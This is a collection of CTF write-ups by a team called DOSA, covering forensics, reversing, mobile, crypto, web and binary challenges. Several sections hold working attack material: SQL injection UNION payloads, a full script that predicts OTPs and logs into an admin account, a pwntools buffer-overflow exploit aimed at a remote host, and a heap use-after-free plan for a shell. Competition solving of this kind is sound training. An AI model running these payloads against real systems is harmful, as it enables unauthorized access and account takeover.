@@ -1,0 +1,1863 @@
+Team Name : DOSA
+
+DATA heist
+flag{1CMP_d4t4_5muggl1ng_1s_4_r34l_thr34t}
+Open the PCAP
+File → Open → select Heist.pcap
+Filter only the ICMP packets
+In the display filter bar (top), type icmp and press Enter.
+You should now see ~128 ICMP packets (mostly echo requests type 8 and replies type 0).
+Select ALL ICMP packets
+Click the very first ICMP packet.
+Scroll to the very last ICMP packet.
+Hold Shift and click the last one → all 128 packets are now highlighted.
+Export the packet data (the fastest manual method)
+With all ICMP packets still selected:
+Go to File → Export Packet Dissections → As Plain Text…
+In the dialog box:
+Packet range: “Selected packets only” (it should already be pre-selected).
+Packet format: Choose “Packet details” (or “Packet bytes” if youwant the full hexdump).
+Output format: Plain text.
+Click Browse and save it somewhere easy (e.g. icmp_export.txt).
+Click Save.
+Save as raw_exfil.txt
+Now copy all the payload and paste in decryptor and those big chunks “flag….” “flag…” are the keys . and After decrypting you will get the flag .
+
+Books in Order – Web Challenge Writeup
+
+Challenge URL: http://185.188.249.142:5000
+
+We find a sql injection in query parameter
+query='
+Error:
+unrecognized token: "' LIMIT 100"
+Then we run this command
+' UNION SELECT 1,2,3,4,5,6,7-- -
+We find 7 coloumn
+Now we enumerate tables:
+' AND 1=0 UNION SELECT 1,2,3,4,5,name,7 FROM sqlite_master WHERE type='table'-- -
+We find secrets
+In secret column : 
+' AND 1=0 UNION SELECT 1,2,3,4,5,group_concat(name,','),7 FROM pragma_table_info('secrets')-- -
+
+We dump the data
+' AND 1=0 UNION SELECT 1,2,3,4,5,group_concat(key||':'||value,'|'),7 FROM secrets-- -
+Output:
+admin_flag:flag{SQL_1nj3ct10n_15_b4d_g46a00}
+
+Brittle padlock
+DES ← This is the main encryption
+Old cipher (like a lock)
+Very weak only 56-bit key	Used ECB mode (this mode is bad and easy to attack)
+I just searchin the web and I found the key it was very easy
+from Crypto.Cipher import DES
+import base64
+
+ciphertext = base64.b64decode("0twztnSUTZA6vaFHQwgJjSNymcnnMQctv40qp7mMkCoOvtiJPqLR45rWRVPnkIWoATOprxd5dnY=")
+
+key = bytes.fromhex("E1E1E1E1F0F0F0F0")
+
+cipher = DES.new(key, DES.MODE_ECB)
+plaintext = cipher.decrypt(ciphertext)
+
+print(plaintext)
+
+flag{DES_cant_keep_secrets_when_the_key_is_weak!}
+
+Loggy
+
+flag{devlopement-keys.pem_dev-neo}
+
+Extract the zip
+Expand-Archive -LiteralPath .\S3.zip -DestinationPath .\S3_extracted -Force
+Pehle sirf object download events filter karo (REST.GET.OBJECT).
+rg -n "REST.GET.OBJECT" .\S3_extracted\S3-Server-Logs
+
+... arn:aws:iam::764581110688:user/dev-neo ... REST.GET.OBJECT delevopers-ec2.pem ... 200 ...
+... arn:aws:iam::764581110688:user/dev-neo ... REST.GET.OBJECT devlopement-keys.pem ... 200 ...
+important:
+
+REST.GET.OBJECT = Download
+Status 200 = successful access
+requester = user/dev-neo
+Ab attacker behavior validate karo (enumeration + exfil chain):
+rg -n "3\.144\.171\.70|dev-neo|REST.GET.BUCKET|REST.GET.OBJECT" .\S3_extracted\S3-Server-Logs
+Isme same IP/user ke saath pehle bucket listing (REST.GET.BUCKET), phir .pem object fetch dikh raha hai. Ye classic discovery + key download pattern hai.
+
+keyname.ext = devlopement-keys.pem
+username = dev-neo
+Final:
+flag{devlopement-keys.pem_dev-neo}
+
+Agar future me similar CTF aaye, same 3 filters yaad rakhna: REST.GET.OBJECT + 200 + suspicious requester/IP correlation.
+
+Grap the fist
+
+First, I checked protocol distribution and host conversations.
+
+Identify suspicious ARP behavior I inspected ARP replies (arp.opcode == 2) and found repeated unsolicited claims from:
+
+MAC: 00:0c:29:aa:bb:cc
+
+This host repeatedly claimed ownership of important IPs (gateway/internal host) toward victim 192.168.10.50, which is classic ARP poisoning behavior.
+
+The same MAC also maps to IP:
+
+192.168.10.30
+
+So attacker identity is:
+
+IP: 192.168.10.30
+MAC: 00:0c:29:aa:bb:cc
+
+3) Recover intercepted sensitive data
+
+I then inspected HTTP traffic and found a login POST request:
+
+POST /login.php
+Content-Type: application/x-www-form-urlencoded
+
+Decoded payload:
+
+username=admin&password=C0rp0r@teP@ss!
+To combine all of this we have = flag{192.168.10.30-00:0c:29:aa:bb:cc-C0rp0r@teP@ss!}
+
+MemoryDumpInj Writeup
+
+legacytool.py shows a red-herring style DES script:
+
+Imports flag from FLAG.py
+Uses DES ECB with key shown as masked: "E1".decode("hex")
+Ciphertext printed in output.txt
+
+At this point, brute forcing the DES key is not intended. The challenge name suggests memory forensics (MemoryDumpInj), so we pivot to the raw memory image.
+
+2) Prepare memory forensics tooling
+
+Used Volatility 3 against MemoryDumpH.raw.
+
+python3 -m venv /tmp/vol3env
+/tmp/vol3env/bin/pip install volatility3
+/tmp/vol3env/bin/vol -q -f /media/sfkali/MemoryDumpH.raw windows.info
+
+
+This confirmed a valid Windows 10 memory image.
+
+3) Find suspicious user activity
+
+Enumerated processes and command lines:
+
+/tmp/vol3env/bin/vol -q -f /media/sfkali/MemoryDumpH.raw windows.pslist
+/tmp/vol3env/bin/vol -q -f /media/sfkali/MemoryDumpH.raw windows.cmdline
+
+
+Interesting process chain found:
+
+powershell.exe (PID 7424)
+notepad.exe
+DumpIt.exe (memory acquisition tool)
+
+This is a strong sign the flag logic executed in PowerShell before dump capture.
+
+4) Recover console history/buffer
+
+Used console plugins:
+
+/tmp/vol3env/bin/vol -q -f /media/sfkali/MemoryDumpH.raw windows.consoles
+/tmp/vol3env/bin/vol -q -f /media/sfkali/MemoryDumpH.raw windows.cmdscan
+
+
+Recovered artifacts included:
+
+Script name: systemTroubleshoot.ps1
+Visible output line: Progress status: 4ch41n
+
+This gives part 2 of the flag.
+
+5) Dump PowerShell memory and extract embedded script strings
+
+Dumped PID 7424 memory:
+
+mkdir -p /tmp/volout
+cd /tmp/volout
+/tmp/vol3env/bin/vol -q -f /media/sfkali/MemoryDumpH.raw windows.memmap --pid 7424 --dump
+strings -n 4 /tmp/volout/pid.7424.dmp | nl -ba | sed -n '12040,12120p'
+
+
+Recovered script lines:
+
+Part 1 written to registry as base64:
+bTNtMHJ5X2YwcjNuczFjc18xc18=
+Part 2 printed directly:
+4ch41n
+Part 3 included as nested base64 marker:
+Encoded flag part 3: TUdaZk0zWXhaSE51WXpNPS
+
+6) Decode all parts
+
+Part 1
+
+bTNtMHJ5X2YwcjNuczFjc18xc18= -> m3m0ryf0r3ns1cs1s
+
+
+Part 3 (double base64)
+
+First decode:
+
+TUdaZk0zWXhaSE51WXpNPS -> MGZfM3YxZHNuYzM=
+
+
+Second decode:
+
+MGZfM3YxZHNuYzM= -> 0f3v1dsnc3
+
+
+Assemble
+
+part1 + part2 + part3
+= m3m0ryf0r3ns1cs1s + 4ch41n + 0f3v1dsnc3
+= m3m0ryf0r3ns1cs1s4ch41n0f3v1dsnc3
+
+
+Final flag:
+
+flag{m3m0ryf0r3ns1cs1s4ch41n0f3v1dsnc3}
+
+
+Notes
+-----
+
+legacytool.py and DES output are mostly distraction/context.
+Intended solve path is memory forensics + PowerShell artifact recovery.
+
+Challenge 3
+---------
+
+PE32 console executable (x86)
+Custom/modified packer behavior
+Very few useful plaintext strings in packed form
+
+Imports and entropy check
+
+objdump -p /media/sfkali/MyWare.packed.exe | sed -n '/The Import Tables/,/The Export Tables/p'
+python3 - <<'PY'
+import pefile
+pe=pefile.PE('/media/sfkali/MyWare.packed.exe')
+for s in pe.sections:
+print(s.Name.decode(errors='ignore').rstrip('\x00'),
+hex(s.VirtualAddress), hex(s.MiscVirtualSize),
+hex(s.SizeOfRawData), round(s.getentropy(),3))
+PY
+
+
+Key signs:
+
+Section CTF1 high entropy
+Entry-point stub looked like decompression/unpacking logic
+UPX-style unpacking, but upx -d failed due to modified/protected stub
+
+
+
+2\. Why dynamic unpacking was needed
+------------------------------------
+
+Static disassembly at OEP (0x41A030) showed a classic unpacker:
+
+bitstream decode loop
+relocation/import fix-up
+jump to real code at 0x40161F
+
+So the plan was:
+
+1. Emulate unpacker stub
+2. Hook imported APIs it needs (LoadLibraryA, GetProcAddress, VirtualProtect, ExitProcess)
+3. Stop at OEP transfer (0x40161F)
+4. Dump unpacked image from emulator memory
+
+
+
+3\. Memory unpacking/emulation
+------------------------------
+
+Using Unicorn x86:
+
+mapped image memory
+wrote original PE image
+patched IAT thunk addresses used by unpacker
+hooked API calls
+stopped when execution reached real OEP (0x40161F)
+dumped unpacked image to:
+/tmp/MyWare.unpacked.full.bin
+
+After dump, strings and disassembly became readable enough to identify anti-VM logic.
+
+
+
+4\. Locate anti-VM logic
+------------------------
+
+Useful strings in unpacked image
+
+strings -n 4 /tmp/MyWare.unpacked.full.bin | rg -i "anti-vm|memory|processor|globalmemorystatusex"
+
+
+Found:
+
+Anti-VM Triggered. Exiting.
+GlobalMemoryStatusEx
+
+String VA for anti-VM message:
+
+0x40F244
+
+Cross-reference showed call site around:
+
+0x4012C6..0x4012D4 (message box path)
+
+
+
+5\. Control-flow around check
+-----------------------------
+
+Main anti-VM sequence (important part):
+
+004012BD: call 0x4010c0
+004012C2: test eax, eax
+004012C4: jne 0x4012e1
+004012C6: ... "Anti-VM Triggered. Exiting."
+
+
+So function 0x4010C0 returns:
+
+1 => environment accepted
+0 => anti-VM triggered
+
+
+
+Important instructions from that function:
+
+004010D7: lea eax, [ebp-0x44]
+004010DA: push eax
+004010DB: call dword ptr [0x40f034] ; GlobalMemoryStatusEx
+
+... (64-bit division helper call)
+
+004010FB: lea eax, [ebp-0x74]
+004010FE: push eax
+004010FF: call dword ptr [0x40f038] ; GetSystemInfo
+
+0040110B: cmp dword ptr [ebp-0x4c], 0
+0040110F: ja 0x40111a
+00401111: cmp dword ptr [ebp-0x50], 0xffff
+00401118: jb 0x401120
+
+0040111A: cmp dword ptr [ebp-0x48], 8
+0040111E: jae 0x401124
+00401120: xor eax, eax
+00401124: mov eax, 1
+
+
+Meaning of locals
+
+[ebp-0x50]:[ebp-0x4c] = 64-bit value of ullTotalPhys / 0x100000 (RAM in MB)
+[ebp-0x48] = dwNumberOfProcessors
+
+Effective condition
+
+Equivalent logic:
+
+rammb = ullTotalPhys / 1048576;
+ok = (rammb >= 0xFFFF) && (dwNumberOfProcessors >= 8);
+
+
+Threshold constants:
+
+RAM threshold: 0xFFFF MB = 65535 MB
+CPU threshold: 8
+
+
+
+7\. Convert RAM threshold to requested format
+---------------------------------------------
+
+Challenge wants RAM in whole GB integer.
+
+65535 MB / 1024 = 63.999... GB, which maps to the practical whole-number threshold of 64 GB.
+
+So final values:
+
+RAM = 64
+ProcessorCount = 8
+
+
+
+Final flag
+----------
+
+flag{64,8}
+
+Concierge
+
+A) Pull the 10 leaked values from /devd3bug.
+B) Fit them to a PRNG model (xorshift128+-style output behavior).
+C) Generate nearby candidate OTP values from reconstructed state.
+D) Test candidates using FRESH sessions (to avoid local attempt lock in one session).
+E) First valid candidate redirects to /admin/dashboard.
+
+Note:
+- If "Too Many Attempts" appears, start fresh session and continue.
+- Because the data rotates every 10 minutes, solve/test quickly in the same window.
+
+Script:
+
+Save as solve_concierge.py and run with Python 3.
+
+```python
+import requests, re, time, random
+from z3 import BitVec, Solver, LShR, UGE, ULE, sat
+
+BASE = 'http://185.188.249.142:5005'
+M = 10_000_000
+TWO53 = 1 << 53
+MASK = (1 << 64) - 1
+
+def otp_from_state0(s0: int) -> int:
+v = (s0 >> 11) & ((1 << 53) - 1)
+return (v * M) >> 53
+
+def bounds(n: int):
+lo = (n * TWO53 + M - 1) // M
+hi = ((n + 1) * TWO53 - 1) // M
+return lo, hi
+
+def fwd_int(s0: int, s1: int):
+t = s0
+s0 = s1
+t ^= (t << 23) & MASK
+t ^= (t >> 17)
+t ^= s0
+t ^= (s0 >> 26)
+s1 = t & MASK
+return s0, s1
+
+def fwd_z3(c0, c1):
+t = c0
+c0 = c1
+t = t ^ ((t << 23) & MASK)
+t = t ^ LShR(t, 17)
+t = t ^ c0
+t = t ^ LShR(c0, 26)
+c1 = t & MASK
+return c0, c1
+
+def unxorshift_right(y, shift):
+x = 0
+for i in range(63, -1, -1):
+b = (y >> i) & 1
+if i + shift <= 63:
+b ^= (x >> (i + shift)) & 1
+x |= b << i
+return x & MASK
+
+def unxorshift_left(y, shift):
+x = 0
+for i in range(64):
+b = (y >> i) & 1
+if i - shift >= 0:
+b ^= (x >> (i - shift)) & 1
+x |= b << i
+return x & MASK
+
+def back_int(c0, c1):
+# invert one xorshift128+-style transition
+p1 = c0
+y = c1 ^ c0 ^ (c0 >> 26)
+x1 = unxorshift_right(y, 17)
+p0 = unxorshift_left(x1, 23)
+return p0 & MASK, p1 & MASK
+
+def create_user_session():
+s = requests.Session()
+u = 'u' + str(int(time.time())) + str(random.randint(100, 999))
+p = 'pass1234'
+s.get(BASE + '/auth/register', timeout=8)
+s.post(BASE + '/auth/register', data={
+'username': u,
+'password': p,
+'confirmPassword': p
+}, timeout=8)
+return s
+
+def get_leak_seq():
+s = create_user_session()
+html = s.get(BASE + '/devd3bug', timeout=8).text
+seq = list(map(int, re.findall(r'\[(?:0\d|10)\]\s+(\d+)', html)))
+tleft = s.get(BASE + '/devd3bug/time-left', timeout=8).json().get('timeLeft')
+return seq, tleft
+
+def derive_candidates(seq):
+# sequence appears in opposite draw order for this PRNG/output behavior
+R = list(reversed(seq))
+
+s0 = BitVec('s0', 64)
+s1 = BitVec('s1', 64)
+solver = Solver()
+
+c0, c1 = s0, s1
+for n in R:
+c0, c1 = fwd_z3(c0, c1)
+lo, hi = bounds(n)
+v = LShR(c0, 11)
+solver.add(UGE(v, lo), ULE(v, hi))
+
+if solver.check() != sat:
+return []
+
+model = solver.model()
+a0 = model[s0].as_long()
+a1 = model[s1].as_long()
+
+states = []
+x0, x1 = a0, a1
+for n in R:
+x0, x1 = fwd_int(x0, x1)
+states.append((x0, x1, otp_from_state0(x0), n))
+
+cands = []
+
+# forward neighborhood from end of shown block
+f0, f1 = states[-1][0], states[-1][1]
+for _ in range(0, 25):
+f0, f1 = fwd_int(f0, f1)
+cands.append(otp_from_state0(f0))
+
+# backward neighborhood from start of shown block
+b0, b1 = states[0][0], states[0][1]
+for _ in range(1, 25):
+b0, b1 = back_int(b0, b1)
+cands.append(otp_from_state0(b0))
+
+# include leaked values too
+cands.extend(seq)
+
+uniq = []
+for c in cands:
+if c not in uniq:
+uniq.append(c)
+return uniq
+
+def test_candidate(otp: int):
+s = create_user_session()
+s.get(BASE + '/admin', timeout=8)
+s.post(BASE + '/admin/login', data={
+'username': 'admin',
+'password': 'securePassw0rd!'
+}, timeout=8)
+
+r = s.post(BASE + '/mfa/admin-verify', data={'otp': f'{otp:07d}'},
+allow_redirects=False, timeout=8)
+
+loc = r.headers.get('Location')
+if loc == '/admin/dashboard':
+page = s.get(BASE + loc, timeout=8).text
+m = re.search(r'[A-Za-z0-9_\-]*\{[^{}\n]{1,200}\}', page)
+flag = m.group(0) if m else 'flag-not-found'
+return True, flag
+return False, None
+
+def main():
+seq, tleft = get_leak_seq()
+print('[+] leaked sequence:', seq)
+print('[+] time left:', tleft)
+
+if len(seq) != 10:
+print('[-] leak parse failed or window changed; retry')
+return
+
+cands = derive_candidates(seq)
+print(f'[+] candidate count: {len(cands)}')
+
+for i, c in enumerate(cands, 1):
+ok, flag = test_candidate(c)
+print(f'[{i:02d}] tested {c:07d} -> {"HIT" if ok else "miss"}')
+if ok:
+print('[+] FLAG:', flag)
+return
+
+print('[-] no hit in this window, wait for next 10-min cycle and rerun')
+
+if __name__ == '__main__':
+main()
+```
+
+------------------------------------------------------------
+5) Expected Success Behavior
+------------------------------------------------------------
+
+When correct OTP is submitted:
+- /mfa/admin-verify returns HTTP 302 to /admin/dashboard
+- Dashboard contains flag in keepsake section.
+
+Example flag obtained:
+- flag{pr3d1ct4bl3_r4nd0mn3ss_1s_n0_r4nd0mn3ss}
+
+Tunnel Vision
+
+Recover the flag from the I2P stage.
+
+Given from Part 1:
+- I2P host: fedafboij5znfjmpxk6kxer5xtttjq3zyweydzesov5awt3g4anq.b32.i2p
+- Password: 0p3r4t10n_sh4d0w
+
+Solve Steps:
+
+1. Set up I2P locally
+- Installed/ran i2pd in user space and started local HTTP proxy at 127.0.0.1:4444.
+- Accessed the target eepsite through this proxy.
+
+2. Reach the hidden service
+- Requested:
+http://fedafboij5znfjmpxk6kxer5xtttjq3zyweydzesov5awt3g4anq.b32.i2p/
+via I2P proxy.
+- Initially got host-down while network warmed up, then got HTTP 401.
+
+3. Authenticate
+- Tried likely usernames with recovered password.
+- Correct credentials:
+username: op3r4t0r
+password: 0p3r4t10n_sh4d0w
+- Login returned an "OPERATIONS BULLETIN" page and a file:
+bulletin.jpg
+
+4. Inspect bulletin.jpg
+- Downloaded bulletin.jpg from authenticated page.
+- Visual/OCR did not immediately reveal flag text.
+- Since challenge hinted encrypted/hidden flag at right place, tested stego extraction.
+
+5. Extract embedded payload with steghide
+- Command used:
+steghide extract -sf bulletin.jpg -p 0p3r4t10n_sh4d0w
+- Extracted file:
+flag2.txt
+
+6. Read extracted file
+- Content:
+FLAG{c0ngrats_y0u_inst4lled_i2p_n0w_g0_touch_gr4ss}
+
+Final Flag:
+FLAG{c0ngrats_y0u_inst4lled_i2p_n0w_g0_touch_gr4ss}
+
+All the Writeups :-
+---------------------
+easy drive :-
+grep -rn "flag{" .
+
+./a/m/flag.txt:1:flag{d33p_1nt0_th3_f0ld3rs}
+
+curfew mobile :-
+cat curfewpass/smali_classes3/com/example/bypassroad/MainActivity.smali
+u will get the hex in password hex :- "666c61677b7730775f73305f4f505f4f4d477d"
+decode it to the HEXADECIMAL TO TEXT :- flag{w0w_s0_OP_OMG}
+
+magic number :-
+file magicnumber
+checksec --file=magicnumber
+strings -a magicnumber
+nm -n magicnumber
+objdump -d magicnumber
+
+magicnumber: ELF 32-bit LSB executable, Intel 80386
+
+Fake Flag (Decoy)
+
+From strings:
+
+Nice try! But this isn't what you're looking for...
+flag{th1s_1s_n0t_th3_r34l_fl4g}
+
+Static Analysis (Ghidra)
+
+Opening the binary in Ghidra reveals an interesting function:
+
+0x08049284 <win>
+
+Inside win():
+
+cmpl $0xcafebebe, 0x8(%ebp)
+cmpl $0x13371337, 0xc(%ebp)
+Condition to Win
+
+The function expects:
+
+arg1 = 0xCAFEBEBE
+arg2 = 0x13371337
+
+So if we can redirect execution to win() with these arguments, we win.
+
+Vulnerability Analysis
+
+Disassembly of vuln():
+
+0x0804938c: lea eax,[ebp-0x6c]
+0x08049390: call gets@plt
+Bug Found: gets()
+gets() reads input without bounds checking
+Buffer location: [ebp - 0x6c]
+
+Offset Calculation
+
+We calculate the distance to overwrite return address:
+
+Buffer size = 0x6c = 108 bytes
+Saved EBP = 4 bytes
+Return address = next 4 bytes
+
+Total offset:
+
+108 + 4 = 112 bytes
+
+So:
+
+OFFSET = 112
+
+'''
+from pwn import *
+import sys
+
+# Binary setup
+elf = ELF('./magicnumber', checksec=False)
+context.binary = elf
+context.arch = 'i386'
+context.os = 'linux'
+
+# --- Configuration ---
+OFFSET = 112
+WIN_ADDR = 0x08049284
+ARG1 = 0xCAFEBEBE
+ARG2 = 0x13371337
+
+def build_payload():
+payload = flat(
+b"A" * OFFSET,
+p32(WIN_ADDR),
+b"AAAA", # dummy return address
+p32(ARG1),
+p32(ARG2)
+)
+return payload
+
+def main():
+if len(sys.argv) == 3:
+io = remote(sys.argv[1], sys.argv[2])
+else:
+io = process(elf.path)
+
+io.recvuntil(b"Please enter your authentication string:")
+
+payload = build_payload()
+io.sendline(payload)
+
+io.interactive()
+
+if __name__ == "__main__":
+main()
+'''
+python3 exploit.py 185.188.249.142 5555
+
+challenge 1 : flag{https://www.quickheal.com}
+
+in strings :-
+<n/[
+Et$\
+rnetCon
+_9ttps://w
+.quickheal.com
+Software\M
+\Windows\Cur
+OsF\RuJ
+T$ubleshoo
+o\ng-S
+F*I. Exi
+
+challenge 2 :- upload on virustotal https://www.virustotal.com/gui/file/b1ad9f6fee358009cde9b6258f6672e3d0550987d914e612b06c285007e8bcda
+
+in detection u will see this :- Code insights
+The sample is a malicious dropper and environment-aware backdoor. It performs a connectivity check against 'quickheal.com' (sub_401000) and executes anti-VM/anti-sandbox checks by verifying CPU core count (>=8) and physical memory size (sub_4010c0). Upon successful environment validation, it decodes a Base64-encoded payload (sub_401140) containing batch commands to disable/modify firewall rules via 'netsh' (opening port 1337). The payload is dropped to 'C:\dr0pp3d.bat' (sub_4011d0) and persistence is established via the 'Run' registry key under the name 'Troubleshooting-Service' (sub_401230). Relevant IOCs include the file path 'C:\dr0pp3d.bat', the registry value 'Troubleshooting-Service', and the use of port 1337.
+
+flag{C:\dr0pp3d.bat}
+
+MusafirHuYaaron.apk Mobile :-
+=============================
+
+Challenge
+---------
+
+APK: MusafirHuYaaron.apk
+Prompt mentions target location: Leh, India (34.1526, 77.5771)
+Flag format: flag{}
+
+1) Unpack and Recon
+-------------------
+
+apktool d MusafirHuYaaron.apk -o MusafirHuYaaron
+
+read : AndroidManifest.xml
+package="com.ctf.armchairexplorer"
+
+Search for obvious indicators:
+┌──(parth¢Þkali)-[~/MusafirHuYaaron]
+└─$ grep -rn "flag{" .
+
+./smali_classes3/com/ctf/armchairexplorer/MainActivity.smali:425: const-string v15, "flag{"
+
+┌──(parth¢Þkali)-[~/MusafirHuYaaron]
+└─$ grep -rn "encrypted" .
+
+./apktool.yml:45:- res/raw/encrypted_flag.bin
+./res/values/public.xml:3905: <public type="raw" name="encrypted_flag" id="0x7f0f0000" />
+./smali_classes3/com/ctf/armchairexplorer/MainActivity.smali:297: sget v2, Lcom/ctf/armchairexplorer/R$raw;->encrypted_flag:I
+./smali_classes3/com/ctf/armchairexplorer/MainActivity.smali:343: .local v4, "encryptedData":[B
+./smali_classes2/com/ctf/armchairexplorer/R$raw.smali:17:.field public static encrypted_flag:I = 0x7f0f0000
+
+
+Important hits:
+
+smaliclasses3/com/ctf/armchairexplorer/MainActivity.smali
+res/raw/encryptedflag.bin
+
+2) Understand the Check Logic
+-----------------------------
+
+In MainActivity.smali:
+
+Target coordinates are hardcoded:
+TARGETLAT = 34.1526
+TARGETLONG = 77.5771
+App computes distance to Leh and if distance <= 50.0f, it calls:
+unlockFlag(latitude, longitude)
+
+So unlocking is location-gated, but not server-side.
+
+'''import math
+
+# 1. Target coordinates hardcoded in MainActivity.smali
+TARGET_LAT = 34.1526
+TARGET_LONG = 77.5771
+
+# 2. Distance threshold (in kilometers/units, assumed)
+THRESHOLD = 50.0
+
+def calculate_distance(lat1, lon1, lat2, lon2):
+"""Calculates distance using Euclidean formula, matching Android logic."""
+# Note: If the app uses GPS (Haversine formula), this would be different.
+# Given the simplicity, it likely uses Cartesian distance,
+# or a straightforward distance formula.
+return math.sqrt((lat2 - lat1)**2 + (lon2 - lon1)**2) * 111.0 # Approximation of KM
+
+def unlock_flag(latitude, longitude):
+"""Simulates the unlockFlag(DD) function."""
+distance = calculate_distance(latitude, longitude, TARGET_LAT, TARGET_LONG)
+print(f"Current Distance: {distance:.2f} km")
+
+if distance <= THRESHOLD:
+print("Distance check passed!")
+# 3. Read res/raw/encryptedflag.bin and decrypt
+# This part requires the actual content of 'encryptedflag.bin'
+# and the encryption key/method (e.g., XOR or AES)
+print("Unlocking flag from res/raw/encryptedflag.bin...")
+# decrypted_flag = decrypt_logic(encrypted_data)
+return "flag{example_flag}"
+else:
+print("Too far from target.")
+return None
+
+# --- Main Execution ---
+# Pretend user location is right next to target
+user_lat = 34.1550
+user_long = 77.5750
+
+flag = unlock_flag(user_lat, user_long)
+if flag:
+print(f"FLAG: {flag}")
+'''
+
+'''
+import hashlib, struct
+from Crypto.Cipher import AES
+
+lat = round(34.1526, 4)
+lon = round(77.5771, 4)
+
+Java ByteBuffer defaults to big-endian; '>d' matches that
+material = struct.pack('>d', lat) + struct.pack('>d', lon)
+key = hashlib.sha256(material).digest()[:16]
+
+data = open('MusafirHuYaaron/res/raw/encryptedflag.bin', 'rb').read()
+iv = data[:12]
+blob = data[12:]
+ciphertext, tag = blob[:-16], blob[-16:]
+
+cipher = AES.new(key, AES.MODEGCM, nonce=iv, maclen=16)
+pt = cipher.decryptandverify(ciphertext, tag).decode()
+
+print(f"flag{{{pt}}}")
+
+'''
+
+final payload :-
+'''
+import struct
+import hashlib
+from Crypto.Cipher import AES
+
+def get_flag():
+# 1. Target Coordinates (Hardcoded in smali)
+lat, lon = 34.1526, 77.5771
+
+# 2. Derive AES-128 Key
+# Round to 4 decimals and pack as 2 doubles (16 bytes total)
+packed_coords = struct.pack('>dd', round(lat, 4), round(lon, 4))
+
+# SHA-256 and take first 16 bytes for AES-128 key
+full_hash = hashlib.sha256(packed_coords).digest()
+aes_key = full_hash[:16]
+
+# 3. Read and Decrypt Data
+# Replace 'encryptedflag.bin' with your actual file path
+try:
+with open('encrypted_flag.bin', 'rb') as f:
+data = f.read()
+except FileNotFoundError:
+return "Error: encrypted_flag.bin not found."
+
+# Split: first 12 bytes = IV, remaining = ciphertext + 16-byte tag
+iv = data[:12]
+ciphertext_with_tag = data[12:]
+ciphertext = ciphertext_with_tag[:-16]
+tag = ciphertext_with_tag[-16:]
+
+# 4. AES-GCM Decryption (NoPadding)
+cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+try:
+decrypted_text = cipher.decrypt_and_verify(ciphertext, tag)
+return f"flag{{{decrypted_text.decode('utf-8')}}}"
+except Exception as e:
+return f"Decryption failed: {e}"
+
+print(get_flag())
+
+'''
+
+final flag :- flag{wh0_n33ds_pl4n3_t1ck3ts_wh3n_y0u_c4n_sp00f}
+
+Registery explorer :-
+-----------------------
+
+Writeup (sirf software.hiv se analysis)
+
+i searched on google whole description and from that i got this :-
+Key Locations Checked:
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\SYSTEM\CurrentControlSet\Services
+THEN :-
+In `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`, a suspicious value was found:
+
+- Value Name: `SystemTaskManager`
+- Data (observed): hidden PowerShell launcher that reads `BinScript` from:
+- `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\StorageSense`
+
+This is abnormal for legitimate Storage Sense usage and indicates registry-resident malware staging.
+
+2. Extract staged payload from registry
+The key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\StorageSense` contains:
+
+- Value Name: `BinScript`
+- Value Data: long Base64 blob
+
+3. Deobfuscation chain
+`BinScript` decoding path:
+
+1. Base64 decode -> PowerShell stage
+2. Stage contains embedded Base64 GZIP blob -> decompress
+3. Output is another Base64-encoded UTF-16 PowerShell stage -> decode
+4. That stage contains another Base64 GZIP blob -> decompress
+5. Final PowerShell script does reflective code execution:
+- decodes shellcode from Base64
+- XOR-decodes each byte with `0x23` (decimal 35)
+- allocates executable memory (`VirtualAlloc`)
+- copies and executes shellcode in memory
+
+### 4. Recover C2 IP from final payload
+After shellcode decode, the C2 IP string is visible in payload bytes as ASCII:
+
+- `176.103.56.89`
+
+This is the attacker endpoint used by the persistent implant.
+1. Isolate affected host immediately.
+2. Remove malicious autorun value:
+- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\SystemTaskManager`
+3. Remove staged payload value:
+- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeviceAccess\StorageSense\BinScript`
+4. Block and alert on outbound connections to `176.103.56.89` at firewall/EDR.
+5. Hunt enterprise-wide for the same registry IOCs and PowerShell behavior.
+6. Rotate credentials potentially exposed on the host.
+7. Perform full memory/disk triage on affected endpoint for secondary payloads/lateral movement artifacts.
+
+---
+
+## Conclusion
+The workstation’s persistent outbound traffic is caused by registry-based PowerShell persistence that executes staged shellcode from registry data. The decoded payload points to attacker C2 IP:
+
+`176.103.56.89`
+
+Flag:
+
+`flag{176.103.56.89}`
+
+BABY NOTE :-
+--------------
+Baby Notes Writeup (Hinglish)
+=============================
+
+TL;DR
+-----
+
+Bug deletenote() me hai: content free hota hai, lekin notes[idx] NULL nahi hota aur metadata struct bhi free nahi hota. Isse same index pe UAF read/write milta hai (view/edit).
+
+1. view se unsorted-bin leak leke libc base nikaala.
+2. UAF edit se tcache poison kiya.
+3. freehook overwrite karke system google se likha.
+4. free("/bin/sh") trigger karke shell li.
+
+Target C2 style summary:
+
+Primitive 1: view on freed large chunk => libc leak.
+Primitive 2: edit on freed tcache chunk => arbitrary malloc return (freehook).
+
+
+
+Binary Behavior (Important)
+---------------------------
+
+Service menu:
+
+1. create
+2. delete
+3. view
+4. edit
+5. exit
+
+Internal note layout:
+
+metadata chunk size: 0x10
+fields:
++0x0 => size
++0x8 => contentptr
+
+create(size)
+
+malloc(0x10) metadata
+malloc(size) content
+read(0, content, size)
+metadata pointer notes[idx] me store hota hai.
+
+delete(idx)
+
+sirf free(notes[idx]->contentptr)
+metadata free nahi hota
+notes\[idx\] = NULL nahi hota
+
+view(idx)
+
+write(1, notes[idx]->contentptr, notes[idx]->size)
+agar chunk free ho chuka hai, to allocator metadata leak hoti hai.
+
+edit(idx)
+
+read(0, notes[idx]->contentptr, notes[idx]->size)
+freed chunk pe write possible => UAF write.
+
+
+
+Thought Process (Attack Planning)
+---------------------------------
+
+1. Pehle socha direct double-free possible hoga, lekin repeated free detection issues aa sakte hain.
+2. Better route: UAF primitives already clean hain, so read + write dono mil rahe.
+3. Leak chahiye for libc: large chunk choose kiya (0x500) taaki tcache bypass ho aur unsorted bin me jaye.
+4. Write primitive chahiye for control: small class (0x80) pe tcache poisoning easiest.
+5. Full RELRO + PIE + NX ke against easiest route: freehook -> system.
+
+
+
+Step-by-Step Exploit
+--------------------
+
